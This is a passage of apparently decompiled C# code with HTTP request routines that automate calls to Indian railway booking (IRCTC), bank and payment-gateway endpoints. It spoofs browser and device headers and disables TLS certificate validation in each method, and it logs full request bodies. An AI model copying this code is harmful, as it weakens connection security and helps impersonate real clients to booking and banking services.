                        if (webProxy_5 != null)
                        {
                            httpWebRequest.Headers.Add("Cache-Control", "no-cache");
                            httpWebRequest.Headers.Add("Pragma", "no-cache");
                        }
                        bool_21 = false;
                    }
                    if (bool_23)
                    {
                        httpWebRequest.ServicePoint.BindIPEndPointDelegate = method_76;
                    }
                    if ((string_86.Contains("fss.co.in") || string_86.Contains("fssnet.co.in")) && !bool_28)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                    }
                    if (string_86.IndexOf("axisbiconnect", StringComparison.CurrentCultureIgnoreCase) > 0)
                    {
                        httpWebRequest.UserAgent = "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)";
                    }
                    if (string_86.IndexOf("middleware/MWServlet", StringComparison.CurrentCultureIgnoreCase) > 0)
                    {
                        httpWebRequest.UserAgent = "Apache-HttpClient/android/" + string_88;
                        httpWebRequest.Connection = "keepalive";
                        httpWebRequest.Headers.Add("Cookie2", "$Version=" + 1);
                    }
                    if (bool_30)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                        bool_30 = false;
                    }
                    else if (num4 != 0)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                        httpWebRequest.Headers.Add("X-Priority", "5");
                        httpWebRequest.Headers.Add("x-msg-priority", "9");
                    }
                    if (bool_29)
                    {
                        bool_29 = false;
                        httpWebRequest.ContentType = "multipart/form-data; boundary=----WebKitFormBoundary" + randomvalueb;
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                        httpWebRequest.ContentType = "application/json";
                        httpWebRequest.Accept = "*/*";
                        httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.5");
                    }
                    if (bool_36)
                    {
                        httpWebRequest.ContentType = "multipart/form-data; boundary=----WebKitFormBoundary" + randomvalueb;
                        bool_36 = false;
                        if (bool_37)
                        {
                            bool_37 = false;
                            httpWebRequest.Headers.Add("browserName", "Chrome");
                            httpWebRequest.Headers.Add("internalIp", "192.168.1.2");
                            httpWebRequest.Headers.Add("assignedClientId", "null");
                            httpWebRequest.Headers.Add("osVersion", "Windows 7");
                            httpWebRequest.Headers.Add("clientId", "Web");
                            httpWebRequest.Headers.Add("deviceId", "null");
                            httpWebRequest.Headers.Add("browserVersion", "27.0.1453.116");
                            httpWebRequest.Headers.Add("userMachineIdentifier", "JNDF");
                            httpWebRequest.Headers.Add("appVersion", "null");
                        }
                        if (string_86.Contains("airtelmoney.in"))
                        {
                            httpWebRequest.Accept = "application/json";
                        }
                    }
                    if (bool_11)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                    }
                    if (bool_38)
                    {
                        httpWebRequest.ContentType = "multipart/form-data; boundary=----WebKitFormBoundary" + randomvalueb;
                        httpWebRequest.UserAgent = "Dalvik/2.1.0 (Linux; U; Android 5.1; A1601 Build/LMY47I";
                        httpWebRequest.Accept = "";
                        bool_38 = false;
                    }
                    if (string_86.Contains("https://checkout.razorpay.com/integration/irctc"))
                    {
                        httpWebRequest.AllowAutoRedirect = true;
                    }
                    if (string_86.Contains("https://www.onlinesbiglobal.com/NPINB"))
                    {
                        if (Int32_0 == 1)
                        {
                            Int32_0 = 0;
                            httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                            httpWebRequest.CachePolicy = new HttpRequestCachePolicy(HttpCacheAgeControl.MaxAge, TimeSpan.FromDays(0.0));
                            httpWebRequest.AllowAutoRedirect = true;
                        }
                        if (Int32_0 == 2)
                        {
                            httpWebRequest.Accept = "*/*";
                            httpWebRequest.Headers.Add("requestId", String_0);
                            httpWebRequest.Headers.Add("X-Requested-With", "XMLHttpRequest");
                            httpWebRequest.Headers.Add("IPTYPE", "XML");
                        }
                    }
                    if (string_86.Contains("merchant.onlinesbi.sbi"))
                    {
                        httpWebRequest.CachePolicy = cachePolicy;
                        httpWebRequest.Headers.Add("sec-ch-ua", "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"");
                        httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                        httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.9,hi;q=0.8");
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                    }
                    if (string_86.Contains("ecomVerifyOtp.action"))
                    {
                        httpWebRequest.ContentType = "application/json";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                    }
                    if (string_86.Contains("ecomSendOtp.action") || string_86.Contains("ecomDoTxn.action"))
                    {
                        httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                        httpWebRequest.Headers.Add("version", "4.0");
                    }
                    if (string_86.Contains("www.airtel.in/bank/api/v1/auth/login/mpin"))
                    {
                        httpWebRequest.ContentType = "application/json";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                        httpWebRequest.Headers.Add("version", "4.0");
                        httpWebRequest.Headers.Add("channel", "WEB");
                    }
                    if (Boolean_0)
                    {
                        Boolean_0 = false;
                        ServicePointManager.Expect100Continue = true;
                    }
                    if (!string.IsNullOrEmpty(text))
                    {
                        string[] array = Strings.Split(text, "&");
                        int num5 = Information.UBound(array);
                        for (int i = 0; i <= num5; i++)
                        {
                            string[] array2 = Strings.Split(array[i], "=");
                            httpWebRequest.Headers.Set(array2[0], array2[1]);
                        }
                        string_71 = "";
                    }
                    if (!string.IsNullOrEmpty(string_88))
                    {
                        httpWebRequest.Referer = string_88;
                    }
                    if (flag2)
                    {
                        //httpWebRequest.GetRequestStream().Write(bytes, 0, bytes.Length);
                        using (Stream stream = httpWebRequest.GetRequestStream())
                        {
                            stream.Write(bytes, 0, bytes.Length);
                        }
                    }
                    httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                    if (num4 != 0 && (httpWebResponse.StatusCode == HttpStatusCode.Found || httpWebResponse.StatusCode == HttpStatusCode.MovedPermanently) && httpWebResponse.Headers["Location"].ToString().Contains("error") && num2 < 20)
                    {
                        Thread.Sleep(200);
                        num2++;
                        text2 = (string_5 = httpWebResponse.GetResponseHeader("Location"));
                        httpWebResponse.Close();
                        httpWebResponse = null;
                        continue;
                    }
                    string string_91 = "";
                    method_96(httpWebResponse, ref string_91);
                    if (bool_11)
                    {
                        bool_11 = false;
                        string_16 = httpWebResponse.GetResponseHeader("Location");
                    }
                    if (bool_24)
                    {
                        string_29 = httpWebResponse.ResponseUri.ToString();
                    }
                    using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream()))
                    {
                        if (bool_64)
                        {
                            text2 = streamReader.ReadToEnd();
                        }
                        else
                        {
                            httpWebRequest.Abort();
                        }
                    }
                    string_89 = text2;
                    num3 = 1;
                    clsMain.Lock("Getting Html out= " + text2);
                    break;
                }
                catch (WebException ex)
                {
                    num3 = 0;
                    webException_1 = ex;
                    string message = ex.Message;
                    bool flag3 = ex.Response != null;
                    string text3 = "";
                    num++;
                    HttpStatusCode httpStatusCode = HttpStatusCode.OK;
                    if (flag3)
                    {
                        httpStatusCode = ((HttpWebResponse)ex.Response).StatusCode;
                        try
                        {
                            text3 = ":" + new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
                        }
                        catch
                        {
                        }
                    }
                    string_90 = "<StatusCode>" + httpStatusCode.ToString() + "</StatusCode>\t<ErrorCode>" + message + "</ErrorCode>\t<ResponseCode>" + text3 + "</ResponseCode>";
                    clsMain.method_74("WebRequestPost WebEx=", string_90);
                    if (num >= 9)
                    {
                        break;
                    }
                    if (message.Contains("The remote name could not be resolved") | message.Contains("Unable to connect to the remote server"))
                    {
                        if (!message.ToUpper().Contains("SERVICEUNAVAILABLE"))
                        {
                            Thread.Sleep(1000);
                            break;
                        }
                        Thread.Sleep(2000);
                    }
                    else if (message.Contains("The underlying connection was closed:"))
                    {
                        if (!message.Contains("An unexpected error occurred on a send") && !message.Contains("A connection that was expected to be kept alive was closed by the server"))
                        {
                            message.Contains("An unexpected error occurred on a receive");
                        }
                        if (num % 2 == 0)
                        {
                            string_52 = "Tls12";
                        }
                        if (num == 3 || num == 4)
                        {
                            flag = true;
                        }
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("The request was aborted: Could not create SSL/TLS secure channel."))
                    {
                        if (num % 2 == 0)
                        {
                            string_52 = "Tls12";
                        }
                        if (num == 3 || num == 4)
                        {
                            flag = true;
                        }
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("The operation has timed out"))
                    {
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("(406) Not Acceptable") || message.Contains("(401) Unauthorized") || message.Contains("(400) Bad Request") || (message.Contains("(404) Not Found") | message.Contains("(409) Conflict")) || (!message.Contains("(500) Internal Server Error") && !message.Contains("(502) Bad Gateway") && !message.Contains("(503) Server Unavailable") && !message.Contains("(504) Gateway Timeout")))
                    {
                        break;
                    }
                }
                catch (Exception ex2)
                {
                    num3 = 0;
                    string_90 = ex2.Message;
                    clsMain.method_74("WebRequestPost Ex=", string_90 + "  hitUrl" + string_86 + "  Inp=" + string_87 + " Ref=" + string_88 + " reHitCount=" + num);
                    if (num < 3 && string_90.Contains("String reference not set to an instance"))
                    {
                        string_90 = "";
                        num++;
                        continue;
                    }
                    break;
                }
                finally
                {
                    try
                    {
                        httpWebResponse?.Close();
                    }
                    catch
                    {
                    }
                }
            }
            return num3 != 0;
        }

        internal bool _Request_Cashfree(string string_86, string string_87, string string_88, WebProxy webProxy_5, ref CookieContainer cookieContainer_2, bool bool_63, bool bool_64, int int_28, int int_29, ref string string_89, ref string string_90, ref WebException webException_1)
        {
            int num = 0;
            int num2 = 0;
            bool flag = false;
            string text = "";
            if (!string.IsNullOrEmpty(string_71))
            {
                text = string_71;
            }
            if (string_87 == null)
            {
                string_87 = "";
            }
            int num3;
            while (true)
            {
                string_90 = "";
                string_89 = "";
                webException_1 = null;
                num3 = 0;
                clsMain.Lock(string_21 + " Getting html in= " + string_86 + "\t Post:" + string_87);
                HttpWebResponse httpWebResponse = null;
                string text2 = "";
                int num4 = ((string_86.IndexOf("https://www.irctc.co.in", StringComparison.CurrentCultureIgnoreCase) == 0 || string_86.IndexOf("http://www.irctc.co.in", StringComparison.CurrentCultureIgnoreCase) == 0) ? 1 : 0);
                try
                {
                    ServicePointManager.Expect100Continue = false;
                    HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_86);
                    httpWebRequest.ProtocolVersion = HttpVersion.Version11;
                    if (flag)
                    {
                        httpWebRequest.Proxy = clsMain.webProxy_0;
                        flag = false;
                    }
                    string_52 = "Tls12";
                    ServicePointManager.ServerCertificateValidationCallback = (object object_0, X509Certificate x509Certificate_0, X509Chain x509Chain_0, SslPolicyErrors sslPolicyErrors_0) => true;
                    HttpRequestCachePolicy cachePolicy = new HttpRequestCachePolicy(HttpCacheAgeControl.MaxAge, TimeSpan.FromDays(0.0));
                    httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
                    httpWebRequest.ConnectionGroupName = clsMain.ConnectionGroupName_;
                    if ((string_52 == "Tls") | (string_52 == "Ssl3"))
                    {
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
                    }
                    else if (string_52 == "Tls12")
                    {
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
                    }
                    if (int_28 > 0)
                    {
                        httpWebRequest.Timeout = int_28;
                    }
                    if (int_29 > 0)
                    {
                        httpWebRequest.ReadWriteTimeout = int_29;
                    }
                    byte[] bytes = Encoding.UTF8.GetBytes(string_87);
                    if (bool_63 && cookieContainer_2 == null)
                    {
                        cookieContainer_2 = new CookieContainer();
                    }
                    httpWebRequest.CookieContainer = cookieContainer_2;
                    bool flag2;
                    if (flag2 = string_87.Length > 0)
                    {
                        httpWebRequest.Method = "POST";
                    }
                    else if (bool_15)
                    {
                        httpWebRequest.Method = "POST";
                        bool_15 = false;
                    }
                    else
                    {
                        httpWebRequest.Method = "GET";
                    }
                    if (bool_40)
                    {
                        httpWebRequest.Method = "PUT";
                        bool_40 = false;
                    }
                    else if (bool_41)
                    {
                        httpWebRequest.Method = "DELETE";
                        bool_41 = false;
                    }
                    httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
                    httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                    httpWebRequest.KeepAlive = true;
                    httpWebRequest.Connection = "keepalive";
                    httpWebRequest.ContentLength = bytes.Length;
                    httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36";
                    if (string_86.Contains(".paytm.in"))
                    {
                        ServicePointManager.Expect100Continue = false;
                        if (bool_13)
                        {
                            bool_13 = false;
                            if (string_86.Contains("https://securegw.paytm.in/instaproxy/bankresponse/ICICIPAY/DC"))
                            {
                                httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                                httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                            }
                            else if (bool_14)
                            {
                                bool_14 = false;
                                httpWebRequest.Headers.Add("sec-ch-ua-mobile", "?0");
                                httpWebRequest.Headers.Add("Cache-Control", "max-age=0");
                                httpWebRequest.Headers.Add("sec-ch-ua-platform", "\"Windows\"");
                                httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                                httpWebRequest.Headers.Add("Sec-Fetch-User", "?1");
                                httpWebRequest.Headers.Add("Sec-Fetch-Dest", "document");
                                httpWebRequest.Headers.Add("Sec-Fetch-Site", "cross-site");
                                httpWebRequest.Headers.Add("Sec-Fetch-Mode", "navigate");
                                httpWebRequest.Headers.Add("sec-ch-ua", "\"Google Chrome\";v=\"95\", \"Chromium\";v=\"95\", \";Not A Brand\";v=\"99\"");
                                httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                                httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                                httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.9");
                            }
                            else if (!string_86.Contains("https://securegw.paytm.in/instaproxy/direct/payment/payonbank/v2"))
                            {
                                httpWebRequest.ContentType = "application/json";
                                httpWebRequest.Accept = "*/*";
                            }
                            httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.9");
                        }
                        else
                        {
                            httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                            httpWebRequest.Headers.Add("Accept-Language", "en-IN,en-US;q=0.9,en;q=0.8");
                            httpWebRequest.Headers.Add("accept-encoding", "gzip, deflate");
                            httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                            httpWebRequest.Headers.Add("Cache-Control", "max-age=0");
                        }
                    }
                    if (string_86.ToLower().Contains("irctc.co.in"))
                    {
                        httpWebRequest.AllowWriteStreamBuffering = false;
                    }
                    if (bool_27)
                    {
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
                        httpWebRequest.Headers.Add("X-Requested-With", "XMLHttpRequest");
                    }
                    if (bool_51)
                    {
                        bool_51 = false;
                        httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                        httpWebRequest.Headers.Add("Cache-Control", "max-age=0");
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                    }
                    else if (string_86.ToLower().Contains("irctc.co.in") && !bool_21)
                    {
                        httpWebRequest.Headers.Add("X-Requested-With", "XMLHttpRequest");
                    }
                    if (bool_21)
                    {
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                        httpWebRequest.Headers.Add("faces-request", "partial/ajax");
                        if (webProxy_5 != null)
                        {
                            httpWebRequest.Headers.Add("Cache-Control", "no-cache");
                            httpWebRequest.Headers.Add("Pragma", "no-cache");
                        }
                        bool_21 = false;
                    }
                    if (bool_23)
                    {
                        httpWebRequest.ServicePoint.BindIPEndPointDelegate = method_76;
                    }
                    if ((string_86.Contains("fss.co.in") || string_86.Contains("fssnet.co.in")) && !bool_28)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                    }
                    if (string_86.IndexOf("axisbiconnect", StringComparison.CurrentCultureIgnoreCase) > 0)
                    {
                        httpWebRequest.UserAgent = "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)";
                    }
                    if (string_86.IndexOf("middleware/MWServlet", StringComparison.CurrentCultureIgnoreCase) > 0)
                    {
                        httpWebRequest.UserAgent = "Apache-HttpClient/android/" + string_88;
                        httpWebRequest.Connection = "keepalive";
                        httpWebRequest.Headers.Add("Cookie2", "$Version=" + 1);
                    }
                    if (bool_30)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                        bool_30 = false;
                    }
                    else if (num4 != 0)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                        httpWebRequest.Headers.Add("X-Priority", "5");
                        httpWebRequest.Headers.Add("x-msg-priority", "9");
                    }
                    if (bool_29)
                    {
                        bool_29 = false;
                        httpWebRequest.ContentType = "application/json;charset=UTF-8";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                        httpWebRequest.ContentType = "application/json";
                        httpWebRequest.Accept = "*/*";
                        httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.5");
                    }
                    if (bool_36)
                    {
                        httpWebRequest.ContentType = "application/json";
                        bool_36 = false;
                        if (bool_37)
                        {
                            bool_37 = false;
                            httpWebRequest.Headers.Add("browserName", "Chrome");
                            httpWebRequest.Headers.Add("internalIp", "192.168.1.2");
                            httpWebRequest.Headers.Add("assignedClientId", "null");
                            httpWebRequest.Headers.Add("osVersion", "Windows 7");
                            httpWebRequest.Headers.Add("clientId", "Web");
                            httpWebRequest.Headers.Add("deviceId", "null");
                            httpWebRequest.Headers.Add("browserVersion", "27.0.1453.116");
                            httpWebRequest.Headers.Add("userMachineIdentifier", "JNDF");
                            httpWebRequest.Headers.Add("appVersion", "null");
                        }
                        if (string_86.Contains("airtelmoney.in"))
                        {
                            httpWebRequest.Accept = "application/json";
                        }
                    }
                    if (bool_11)
                    {
                        httpWebRequest.AllowAutoRedirect = false;
                    }
                    if (bool_38)
                    {
                        httpWebRequest.ContentType = "application/json;charset=UTF-8";
                        httpWebRequest.UserAgent = "Dalvik/2.1.0 (Linux; U; Android 5.1; A1601 Build/LMY47I";
                        httpWebRequest.Accept = "";
                        bool_38 = false;
                    }
                    if (string_86.Contains("https://checkout.razorpay.com/integration/irctc"))
                    {
                        httpWebRequest.AllowAutoRedirect = true;
                    }
                    if (string_86.Contains("https://www.onlinesbiglobal.com/NPINB"))
                    {
                        if (Int32_0 == 1)
                        {
                            Int32_0 = 0;
                            httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                            httpWebRequest.CachePolicy = new HttpRequestCachePolicy(HttpCacheAgeControl.MaxAge, TimeSpan.FromDays(0.0));
                            httpWebRequest.AllowAutoRedirect = true;
                        }
                        if (Int32_0 == 2)
                        {
                            httpWebRequest.Accept = "*/*";
                            httpWebRequest.Headers.Add("requestId", String_0);
                            httpWebRequest.Headers.Add("X-Requested-With", "XMLHttpRequest");
                            httpWebRequest.Headers.Add("IPTYPE", "XML");
                        }
                    }
                    if (string_86.Contains("merchant.onlinesbi.sbi"))
                    {
                        httpWebRequest.CachePolicy = cachePolicy;
                        httpWebRequest.Headers.Add("sec-ch-ua", "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"");
                        httpWebRequest.Headers.Add("Upgrade-Insecure-Requests", "1");
                        httpWebRequest.Headers.Add("Accept-Language", "en-US,en;q=0.9,hi;q=0.8");
                        httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                    }
                    if (string_86.Contains("ecomVerifyOtp.action"))
                    {
                        httpWebRequest.ContentType = "application/json";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                    }
                    if (string_86.Contains("ecomSendOtp.action") || string_86.Contains("ecomDoTxn.action"))
                    {
                        httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                        httpWebRequest.Headers.Add("version", "4.0");
                    }
                    if (string_86.Contains("www.airtel.in/bank/api/v1/auth/login/mpin"))
                    {
                        httpWebRequest.ContentType = "application/json";
                        httpWebRequest.Accept = "application/json, text/plain, */*";
                        httpWebRequest.Headers.Add("version", "4.0");
                        httpWebRequest.Headers.Add("channel", "WEB");
                    }
                    if (Boolean_0)
                    {
                        Boolean_0 = false;
                        ServicePointManager.Expect100Continue = true;
                    }
                    if (!string.IsNullOrEmpty(text))
                    {
                        string[] array = Strings.Split(text, "&");
                        int num5 = Information.UBound(array);
                        for (int i = 0; i <= num5; i++)
                        {
                            string[] array2 = Strings.Split(array[i], "=");
                            httpWebRequest.Headers.Set(array2[0], array2[1]);
                        }
                        string_71 = "";
                    }
                    if (!string.IsNullOrEmpty(string_88))
                    {
                        httpWebRequest.Referer = string_88;
                    }
                    if (flag2)
                    {
                        //httpWebRequest.GetRequestStream().Write(bytes, 0, bytes.Length);
                        using (Stream stream = httpWebRequest.GetRequestStream())
                        {
                            stream.Write(bytes, 0, bytes.Length);
                        }
                    }
                    httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                    if (num4 != 0 && (httpWebResponse.StatusCode == HttpStatusCode.Found || httpWebResponse.StatusCode == HttpStatusCode.MovedPermanently) && httpWebResponse.Headers["Location"].ToString().Contains("error") && num2 < 20)
                    {
                        Thread.Sleep(200);
                        num2++;
                        text2 = (string_5 = httpWebResponse.GetResponseHeader("Location"));
                        httpWebResponse.Close();
                        httpWebResponse = null;
                        continue;
                    }
                    string string_91 = "";
                    method_96(httpWebResponse, ref string_91);
                    if (bool_11)
                    {
                        bool_11 = false;
                        string_16 = httpWebResponse.GetResponseHeader("Location");
                    }
                    if (bool_24)
                    {
                        string_29 = httpWebResponse.ResponseUri.ToString();
                    }
                    using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream()))
                    {
                        if (bool_64)
                        {
                            text2 = streamReader.ReadToEnd();
                        }
                        else
                        {
                            httpWebRequest.Abort();
                        }
                    }
                    string_89 = text2;
                    num3 = 1;
                    clsMain.Lock("Getting Html out= " + text2);
                    break;
                }
                catch (WebException ex)
                {
                    num3 = 0;
                    webException_1 = ex;
                    string message = ex.Message;
                    bool flag3 = ex.Response != null;
                    string text3 = "";
                    num++;
                    HttpStatusCode httpStatusCode = HttpStatusCode.OK;
                    if (flag3)
                    {
                        httpStatusCode = ((HttpWebResponse)ex.Response).StatusCode;
                        try
                        {
                            text3 = ":" + new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
                        }
                        catch
                        {
                        }
                    }
                    string_90 = "<StatusCode>" + httpStatusCode.ToString() + "</StatusCode>\t<ErrorCode>" + message + "</ErrorCode>\t<ResponseCode>" + text3 + "</ResponseCode>";
                    clsMain.method_74("WebRequestPost WebEx=", string_90);
                    if (num >= 9)
                    {
                        break;
                    }
                    if (message.Contains("The remote name could not be resolved") | message.Contains("Unable to connect to the remote server"))
                    {
                        if (!message.ToUpper().Contains("SERVICEUNAVAILABLE"))
                        {
                            Thread.Sleep(1000);
                            break;
                        }
                        Thread.Sleep(2000);
                    }
                    else if (message.Contains("The underlying connection was closed:"))
                    {
                        if (!message.Contains("An unexpected error occurred on a send") && !message.Contains("A connection that was expected to be kept alive was closed by the server"))
                        {
                            message.Contains("An unexpected error occurred on a receive");
                        }
                        if (num % 2 == 0)
                        {
                            string_52 = "Tls12";
                        }
                        if (num == 3 || num == 4)
                        {
                            flag = true;
                        }
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("The request was aborted: Could not create SSL/TLS secure channel."))
                    {
                        if (num % 2 == 0)
                        {
                            string_52 = "Tls12";
                        }
                        if (num == 3 || num == 4)
                        {
                            flag = true;
                        }
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("The operation has timed out"))
                    {
                        if (num >= 5)
                        {
                            break;
                        }
                    }
                    else if (message.Contains("(406) Not Acceptable") || message.Contains("(401) Unauthorized") || message.Contains("(400) Bad Request") || (message.Contains("(404) Not Found") | message.Contains("(409) Conflict")) || (!message.Contains("(500) Internal Server Error") && !message.Contains("(502) Bad Gateway") && !message.Contains("(503) Server Unavailable") && !message.Contains("(504) Gateway Timeout")))
                    {
                        break;
                    }
                }
                catch (Exception ex2)
                {
                    num3 = 0;
                    string_90 = ex2.Message;
                    clsMain.method_74("WebRequestPost Ex=", string_90 + "  hitUrl" + string_86 + "  Inp=" + string_87 + " Ref=" + string_88 + " reHitCount=" + num);
                    if (num < 3 && string_90.Contains("String reference not set to an instance"))
                    {
                        string_90 = "";
                        num++;
                        continue;
                    }
                    break;
                }
                finally
                {
                    try
                    {
                        httpWebResponse?.Close();
                    }
                    catch
                    {
                    }
                }
            }
            return num3 != 0;
        }


        internal bool _Request(string string_86, string string_87, string string_88, WebProxy webProxy_5, ref CookieContainer cookieContainer_2, bool bool_63, bool bool_64, int int_28, int int_29, ref string string_89, ref string string_90, ref WebException webException_1)
        {
            int num = 0;
            int num2 = 0;
            bool flag = false;
            string text = "";
            if (!string.IsNullOrEmpty(string_71))
            {
                text = string_71;
            }
            if (string_87 == null)
            {
                string_87 = "";
            }
            int num3;
            while (true)
            {
                string_90 = "";
                string_89 = "";
                webException_1 = null;
                num3 = 0;
                clsMain.Lock(string_21 + " Getting html in= " + string_86 + "\t Post:" + string_87);
                HttpWebResponse httpWebResponse = null;
                string text2 = "";
                int num4 = ((string_86.IndexOf("https://www.irctc.co.in", StringComparison.CurrentCultureIgnoreCase) == 0 || string_86.IndexOf("http://www.irctc.co.in", StringComparison.CurrentCultureIgnoreCase) == 0) ? 1 : 0);
                try
                {
                    ServicePointManager.Expect100Continue = false;
                    HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_86);
                    httpWebRequest.ProtocolVersion = HttpVersion.Version11;
                    if (flag)
                    {
                        httpWebRequest.Proxy = clsMain.webProxy_0;
                        flag = false;
                    }
                    string_52 = "Tls12";
                    ServicePointManager.ServerCertificateValidationCallback = (object object_0, X509Certificate x509Certificate_0, X509Chain x509Chain_0, SslPolicyErrors sslPolicyErrors_0) => true;
                    HttpRequestCachePolicy cachePolicy = new HttpRequestCachePolicy(HttpCacheAgeControl.MaxAge, TimeSpan.FromDays(0.0));
                    httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
                    httpWebRequest.ConnectionGroupName = clsMain.ConnectionGroupName_;
                    if ((string_52 == "Tls") | (string_52 == "Ssl3"))
                    {
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
                    }
                    else if (string_52 == "Tls12")
                    {
                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
                    }
                    if (int_28 > 0)
                    {
                        httpWebRequest.Timeout = int_28;
                    }
                    if (int_29 > 0)
                    {
                        httpWebRequest.ReadWriteTimeout = int_29;
                    }
                    byte[] bytes = Encoding.UTF8.GetBytes(string_87);
                    if (bool_63 && cookieContainer_2 == null)
                    {
                        cookieContainer_2 = new CookieContainer();
                    }
                    httpWebRequest.CookieContainer = cookieContainer_2;
                    bool flag2;
                    if (flag2 = string_87.Length > 0)
                    {
                        httpWebRequest.Method = "POST";
                    }
                    else if (bool_15)
                    {
                        httpWebRequest.Method = "POST";
                        bool_15 = false;
                    }
                    else
                    {
                        httpWebRequest.Method = "GET";
                    }
                    if (bool_40)
                    {
                        httpWebRequest.Method = "PUT";
                        bool_40 = false;
                    }
                    else if (bool_41)
                    {
                        httpWebRequest.Method = "DELETE";
                        bool_41 = false;
                    }
                    httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
                    httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                    httpWebRequest.KeepAlive = true;
                    httpWebRequest.Connection = "keepalive";
                    httpWebRequest.ContentLength = bytes.Length;
                    httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36";
                    if (string_86.Contains(".paytm.in"))
                    {
                        ServicePointManager.Expect100Continue = false;
                        if (bool_13)
                        {
                            bool_13 = false;
                            if (string_86.Contains("https://securegw.paytm.in/instaproxy/bankresponse/ICICIPAY/DC"))
                            {
                                httpWebRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
                                httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                            }
                            else if (bool_14)
                            {
                                bool_14 = false;
                                httpWebRequest.Headers.Add("sec-ch-ua-mobile", "?0");
                                httpWebRequest.Headers.Add("Cache-Control", "max-age=0");
                                httpWebRequest.Headers.Add("sec-ch-ua-platform", "\"Windows\"");
                                httpWebRequest.ContentType = "application/x-www-form-urlencoded";
